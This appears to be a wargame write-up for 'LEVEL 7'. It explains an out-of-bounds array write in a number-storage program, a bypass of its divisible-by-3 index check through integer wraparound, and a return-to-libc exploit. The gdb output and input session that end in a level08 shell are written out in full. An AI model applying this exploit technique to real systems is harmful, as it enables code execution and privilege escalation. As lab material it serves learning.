<h1 align="center"> LEVEL 7 </h1>

## Analysis of Decompiled [level7](./pseudo.py)

### The program implements a “number storage” array on the stack:
```
unsigned int data[100];
```
### Out‑of‑bounds indexing:
```
*(data + index * 4) = number;

```
There is no check that index is between 0 and 99.

protection is bypassable:
```
if (index % 3 == 0)
    error;
```
### goal
We want the byte distance from data[0] to the saved return address (the place we want to overwrite). Once we have that distance in bytes we divide by 4 to get the index.

From the disassembly you gave:

sub $0x1d0, %esp → the function reserves 0x1d0 = 464 bytes for locals (including data[]).

lea 0x24(%esp), %ebx → data[0] lives at ESP + 0x24 (that is 36 bytes above ESP at that point).

There are 4 pushes done in the prologue (push %ebp, push %edi, push %esi, push %ebx) → total 4 × 4 = 16 bytes of pushes above current ESP when comparing to saved return layout.

The and $0xfffffff0, %esp aligned the stack to 16 bytes; in this run the alignment moved ESP downward by 12 bytes (that’s what “removed 12 bytes” means in your note).

locals_size = 464

offset_of_data_in_locals = 36

pushes = 16

alignment_adjust = 12

plus the saved-EIP offset correction (we'll fold that into the algebra below)

```
distance = 464 - 36 + 16 + 12 = 456 bytes
456 / 4 = 114
```

but 114 is divisible by 3, so we will find the integer that will overflow to 114 * 4: 1073741824 it's UINT_MAX/4
1073741824 + 114 = 1073741938

### exploiting

we gona fill this field by the system address and we keep the next and we change the address 116 to address '/bin/sh' (return to libc)


```BASH
(gdb) p &system
$2 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb)

Input command: store
 Number: 4159090384 <--- 0xF7E6AED0 <system>
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172 <-- 0xF7F897EC "/bin/sh"
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
```